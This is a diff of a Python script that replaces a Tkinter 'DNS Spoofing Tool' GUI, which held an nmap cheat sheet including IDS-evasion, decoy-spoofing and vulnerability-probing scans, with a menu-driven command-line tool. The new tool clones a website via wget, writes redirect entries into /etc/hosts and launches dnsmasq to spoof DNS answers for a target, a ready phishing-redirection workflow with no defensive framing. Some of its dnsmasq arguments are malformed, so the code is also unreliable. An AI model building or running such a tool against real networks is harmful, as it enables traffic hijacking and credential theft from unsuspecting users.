@@ -1,242 +1,91 @@
 import os
+import sys
 import subprocess
-import shutil
-import tkinter as tk
-from tkinter import filedialog, messagebox, simpledialog, ttk
-import netifaces
-import nmap
-import requests
-from bs4 import BeautifulSoup
-import re
-import threading
-import getpass
-from tkinter.scrolledtext import ScrolledText
+import socket
 
-class Tooltip:
-    def __init__(self, widget, text):
-        self.widget = widget
-        self.text = text
-        self.widget.bind("<Enter>", self.enter)
-        self.widget.bind("<Leave>", self.leave)
-        self.tooltip = None
+def show_own_ip():
+    own_ip = socket.gethostbyname(socket.gethostname())
+    print(f"Your IP address is: {own_ip}")
 
-    def enter(self, event=None):
-        self.tooltip = tk.Toplevel(self.widget)
-        x, y, _, _ = self.widget.bbox("insert")
-        x_root, y_root = self.widget.winfo_rootx() + x + 25, self.widget.winfo_rooty() + y + 20
-        self.tooltip.wm_overrideredirect(True)
-        self.tooltip.wm_geometry(f"+{x_root}+{y_root}")
-        label = tk.Label(self.tooltip, text=self.text, background="#ffffe0", relief="solid", borderwidth=1)
-        label.pack(ipadx=1)
+def clone_website():
+    url = input("Enter the URL of the website you want to clone: ")
+    try:
+        subprocess.run(["wget", "--mirror", "--convert-links", "--adjust-extension", "--page-requisites", url])
+        print("Website cloned successfully!")
+    except Exception as e:
+        print(f"Error while cloning website: {e}")
 
-    def leave(self, event=None):
-        if self.tooltip:
-            self.tooltip.destroy()
+def modify_host_file(ip_address, url):
+    try:
+        with open('/etc/hosts', 'a') as hostfile:
+            hostfile.write(f"{ip_address} {url}\n")
+        print("Host file modified successfully!")
+    except Exception as e:
+        print(f"Error while modifying host file: {e}")
 
-class NmapScanWindow:
-    def __init__(self, parent, ip_range):
-        self.parent = parent
-        self.ip_range = ip_range
-        self.root = tk.Toplevel(parent)
-        self.root.title("Nmap Scan Progress")
+def start_dns_spoofing(interface=None, target_ip=None, gateway_ip=None, dns_server=None):
+    try:
+        command = ["dnsmasq", "-C", "/etc/dnsmasq.conf"]
+        if interface:
+            command.extend(["-i", interface])
+        if target_ip and gateway_ip:
+            command.extend(["--interface=", interface, "--address=", f"/{target_ip}/{gateway_ip}"])
+        if dns_server:
+            command.extend(["--server=", dns_server])
+        subprocess.run(command)
+        print("DNS spoofing started successfully!")
+    except Exception as e:
+        print(f"Error while starting DNS spoofing: {e}")
 
-        self.progress_label = tk.Label(self.root, text="Scanning in progress...")
-        self.progress_label.pack(padx=10, pady=5)
+def main():
+    print("DNS Spoofing Steps:")
+    print("1. Show your own IP address")
+    print("2. Clone a website")
+    print("3. Modify the host file")
+    print("4. Start DNS spoofing")
 
-        self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="determinate")
-        self.progress_bar.pack(padx=10, pady=5)
+    while True:
+        try:
+            option = int(input("Enter the step number to proceed (1-4): "))
+            if option < 1 or option > 4:
+                raise ValueError
+            break
+        except ValueError:
+            print("Invalid input. Please enter a number between 1 and 4.")
 
-        self.scan_result_text = tk.Text(self.root, height=15, width=50)
-        self.scan_result_text.pack(padx=10, pady=5)
+    if option == 1:
+        show_own_ip()
+    elif option == 2:
+        clone_website()
+    elif option == 3:
+        ip_address = input("Enter the IP address to redirect to: ")
+        url = input("Enter the URL to redirect: ")
+        modify_host_file(ip_address, url)
+    elif option == 4:
+        print("Options for starting DNS spoofing:")
+        print("1. Start DNS spoofing on default interface")
+        print("2. Start DNS spoofing on specific interface with target and gateway IPs")
+        print("3. Start DNS spoofing with custom DNS server")
 
-    def update_scan_progress(self, percent):
-        self.progress_bar["value"] = percent
-        self.root.update()
+        while True:
+            try:
+                spoof_option = int(input("Enter the option number to proceed (1-3): "))
+                if spoof_option < 1 or spoof_option > 3:
+                    raise ValueError
+                break
+            except ValueError:
+                print("Invalid input. Please enter a number between 1 and 3.")
 
-    def update_scan_results(self, results):
-        self.scan_result_text.insert(tk.END, results)
-        self.scan_result_text.see(tk.END)
-
-    def close_window(self):
-        self.root.destroy()
-
-class NmapTab:
-    def __init__(self, parent):
-        self.parent = parent
-        self.frame = ttk.Frame(parent)
-
-        self.command_label = tk.Label(self.frame, text="Nmap Command:")
-        self.command_label.pack(padx=10, pady=5)
-
-        self.command_entry = tk.Entry(self.frame)
-        self.command_entry.pack(padx=10, pady=5)
-
-        self.run_button = tk.Button(self.frame, text="Run", command=self.run_nmap_command)
-        self.run_button.pack(padx=10, pady=5)
-
-        self.result_text = ScrolledText(self.frame, wrap='word', width=100, height=30)
-        self.result_text.pack(padx=10, pady=10)
-
-    def run_nmap_command(self):
-        command = self.command_entry.get()
-        if command:
-            result = subprocess.run(command.split(), capture_output=True, text=True)
-            self.result_text.insert('end', result.stdout)
-        else:
-            messagebox.showerror("Error", "Please enter a valid Nmap command.")
-
-class DNS_Spoofing_Tool:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("DNS Spoofing Tool")
-        self.downloaded_folder = ""
-
-        self.tab_control = ttk.Notebook(root)
-        self.tab_control.pack(expand=1, fill="both")
-
-        self.nmap_tab = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.nmap_tab, text="Nmap")
-
-        self.dns_spoofing_tab = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.dns_spoofing_tab, text="DNS Spoofing")
-
-        # Nmap Tab
-        self.nmap_interface = NmapTab(self.nmap_tab)
-
-        # DNS Spoofing Tab
-        self.parrot_ip_label = tk.Label(self.dns_spoofing_tab, text="Your IP:")
-        self.parrot_ip_label.grid(row=0, column=0, padx=10, pady=5)
-
-        # Add other widgets for the DNS Spoofing tab...
-
-        # Create the Nmap UI within the Nmap tab
-        nmap_ui = NmapUI(self.nmap_tab)
-
-class NmapUI:
-    def __init__(self, parent):
-        self.parent = parent
-        self.frame = ttk.Frame(parent)
-
-        self.tabs = ttk.Notebook(self.frame)
-        self.tabs.pack(fill='both', expand=True)
-
-        self.create_nmap_tab()
-
-    def create_nmap_tab(self):
-        self.nmap_tab = ttk.Frame(self.tabs)
-        self.tabs.add(self.nmap_tab, text="Nmap Commands")
-
-        # Define the Nmap commands and descriptions
-        nmap_commands = {
-            "Scan Basics": {
-                "nmap 192.168.1.1": "Scan a single IP",
-                "nmap 192.168.1.1 192.168.2.1": "Scan specific IPs",
-                "nmap 192.168.1.1-254": "Scan a range",
-                "nmap scanme.nmap.org": "Scan a domain",
-                "nmap 192.168.1.0/24": "Scan using CIDR notation",
-                "-iL": "nmap -iL targets.txt\nScan targets from a file",
-                "-iR": "nmap -iR 100\nScan 100 random hosts",
-                "-exclude": "nmap -exclude 192.168.1.1\nExclude listed hosts",
-            },
-            "Host Discovery": {
-                "-sL": "nmap 192.168.1.1-3 -sL\nNo Scan. List targets only",
-                "-sn": "nmap 192.168.1.1/24 -sn\nDisable port scanning. Host discovery only.",
-                "-Pn": "nmap 192.168.1.1-5 -Pn\nDisable host discovery. Port scan only.",
-                "-PS": "nmap 192.168.1.1-5 -PS22-25,80\nTCP SYN discovery on port x. Port 80 by default",
-                "-PA": "nmap 192.168.1.1-5 -PA22-25,80\nTCP ACK discovery on port x. Port 80 by default",
-                "-PU": "nmap 192.168.1.1-5 -PU53\nUDP discovery on port x. Port 40125 by default",
-                "-PR": "nmap 192.168.1.1-1/24 -PR\nARP discovery on local network",
-                "-n": "nmap 192.168.1.1 -n\nNever do DNS resolution",
-            },
-            "Port Specification": {
-                "-p1": "nmap 192.168.1.1 -p 21\nPort scan for port x",
-                "-p2": "nmap 192.168.1.1 -p 21-100\nPort range",
-                "-p3": "nmap 192.168.1.1 -p U:53,T:21-25,80\nPort scan multiple TCP and UDP ports",
-                "-p4": "nmap 192.168.1.1 -p-\nPort scan all ports",
-                "-p5": "nmap 192.168.1.1 -p http,https\nPort scan from service name",
-                "-F": "nmap 192.168.1.1 -F\nFast port scan (100 ports)",
-                "-top-ports": "nmap 192.168.1.1 -top-ports 2000\nPort scan the top x ports",
-                "-p-65535": "nmap 192.168.1.1 -p-65535\nLeaving off initial port in range makes the scan start at port 1",
-                "-p0-": "nmap 192.168.1.1 -p0-\nLeaving off end port in range makes the scan go through to port 65535",
-            },
-            "Service and Version Detection": {
-                "-sV": "nmap 192.168.1.1 -sV\nAttempts to determine the version of the service running on port",
-                "-sV -version-intensity": "nmap 192.168.1.1 -sV -version-intensity 8\nIntensity level 0 to 9. Higher number increases possibility of correctness",
-                "-sV -version-light": "nmap 192.168.1.1 -sV -version-light\nEnable light mode. Lower possibility of correctness. Faster",
-                "-sV -version-all": "nmap 192.168.1.1 -sV -version-all\nEnable intensity level 9. Higher possibility of correctness. Slower",
-                "-A": "nmap 192.168.1.1 -A\nEnables OS detection, version detection, script scanning, and traceroute",
-            },
-            "OS Detection": {
-                "-O": "nmap 192.168.1.1 -O\nRemote OS detection using TCP/IP stack fingerprinting",
-                "-O -osscan-limit": "nmap 192.168.1.1 -O -osscan-limit\nIf at least one open and one closed TCP port are not found it will not try OS detection against host",
-                "-O -osscan-guess": "nmap 192.168.1.1 -O -osscan-guess\nMakes Nmap guess more aggressively",
-                "-O -max-os-tries": "nmap 192.168.1.1 -O -max-os-tries 1\nSet the maximum number x of OS detection tries against a target",
-                "-A": "nmap 192.168.1.1 -A\nEnables OS detection, version detection, script scanning, and traceroute",
-            },
-            "Timing and Performance": {
-                "-T0": "nmap 192.168.1.1 -T0\nParanoid (0) Intrusion Detection System evasion",
-                "-T1": "nmap 192.168.1.1 -T1\nSneaky (1) Intrusion Detection System evasion",
-                "-T2": "nmap 192.168.1.1 -T2\nPolite (2) slows down the scan to use less bandwidth and use less target machine resources",
-                "-T3": "nmap 192.168.1.1 -T3\nNormal (3) which is default speed",
-                "-T4": "nmap 192.168.1.1 -T4\nAggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network",
-                "-T5": "nmap 192.168.1.1 -T5\nInsane (5) speeds scan; assumes you are on an extraordinarily fast network",
-            },
-            "NSE Scripts": {
-                "-sC": "nmap 192.168.1.1 -sC\nScan with default NSE scripts. Considered useful for discovery and safe",
-                "-script default": "nmap 192.168.1.1 -script default\nScan with default NSE scripts. Considered useful for discovery and safe",
-                "-script": "nmap 192.168.1.1 -script=banner\nScan with a single script. Example banner",
-                "-script": "nmap 192.168.1.1 -script=http*\nScan with a wildcard. Example http",
-                "-script": "nmap 192.168.1.1 -script=http,banner\nScan with two scripts. Example http and banner",
-                "-script": "nmap 192.168.1.1 -script \"not intrusive\"\nScan default, but remove intrusive scripts",
-                "-script-args": "nmap -script snmp-sysdescr -script-args snmpcommunity=admin 192.168.1.1\nNSE script with arguments",
-                # Add more NSE scripts as needed...
-            },
-            "Useful NSE Script Examples": {
-                "nmap -Pn -script=http-sitemap-generator scanme.nmap.org": "http site map generator",
-                "nmap -n -Pn -p 80 -open -sV -vvv -script banner,http-title -iR 1000": "Fast search for random web servers",
-                "nmap -Pn -script=dns-brute domain.com": "Brute forces DNS hostnames guessing subdomains",
-                "nmap -n -Pn -vv -O -sV -script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1": "Safe SMB scripts to run",
-                "nmap -script whois* domain.com": "Whois query",
-                "nmap -p80 -script http-unsafe-output-escaping scanme.nmap.org": "Detect cross site scripting vulnerabilities",
-                "nmap -p80 -script http-sql-injection scanme.nmap.org": "Check for SQL injections",
-                # Add more useful NSE script examples as needed...
-            },
-            "Firewall / IDS Evasion and Spoofing": {
-                "-f": "nmap 192.168.1.1 -f\nRequested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters",
-                "-mtu": "nmap 192.168.1.1 -mtu 32\nSet your own offset size",
-                "-D": "nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1\nSend scans from spoofed IPs",
-                "-S": "nmap -S www.microsoft.com www.facebook.com\nScan Facebook from Microsoft (-e eth0 -Pn may be required)",
-                "-g": "nmap -g 53 192.168.1.1\nUse given source port number",
-                "-proxies": "nmap -proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1\nRelay connections through HTTP/SOCKS4 proxies",
-                "-data-length": "nmap -data-length 200 192.168.1.1\nAppends random data to sent packets",
-                # Add more firewall / IDS evasion and spoofing options as needed...
-            },
-            "Miscellaneous Nmap Flags": {
-                "-6": "nmap -6 2607:f0d0:1002:51::4\nEnable IPv6 scanning",
-                "-h": "nmap -h\nnmap help screen",
-                "": "nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn\nDiscovery only on ports x, no port scan",
-                "": "nmap 192.168.1.1-1/24 -PR -sn -vv\nArp discovery only on local network, no port scan",
-                "": "nmap -iR 10 -sn -traceroute\nTraceroute to random targets, no port scan",
-                "": "nmap 192.168.1.1-50 -sL -dns-server 192.168.1.1\nQuery the Internal DNS for hosts, list targets only",
-                "": "nmap 192.168.1.1 --packet-trace\nShow the details of the packets that are sent and received during a scan and capture the traffic.",
-                # Add more miscellaneous Nmap flags as needed...
-            }
-        }
-
-        # Create a scrolled text widget
-        nmap_text = ScrolledText(self.nmap_tab, wrap='word', width=100, height=30)
-        nmap_text.grid(row=0, column=0, padx=10, pady=10)
-
-        # Insert commands and descriptions into the scrolled text widget
-        for section, commands in nmap_commands.items():
-            nmap_text.insert('end', f"{section}:\n")
-            for command, description in commands.items():
-                nmap_text.insert('end', f"{command}\t{description}\n")
-            nmap_text.insert('end', '\n')
-
-        nmap_text.configure(state='disabled')  # Make the text widget read-only
+        if spoof_option == 1:
+            start_dns_spoofing()
+        elif spoof_option == 2:
+            interface = input("Enter the interface name: ")
+            target_ip = input("Enter the target IP address: ")
+            gateway_ip = input("Enter the gateway IP address: ")
+            start_dns_spoofing(interface, target_ip, gateway_ip)
+        elif spoof_option == 3:
+            dns_server = input("Enter the custom DNS server IP address: ")
+            start_dns_spoofing(dns_server=dns_server)
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    dns_spoofing_tool = DNS_Spoofing_Tool(root)
-    root.mainloop()
+    main()
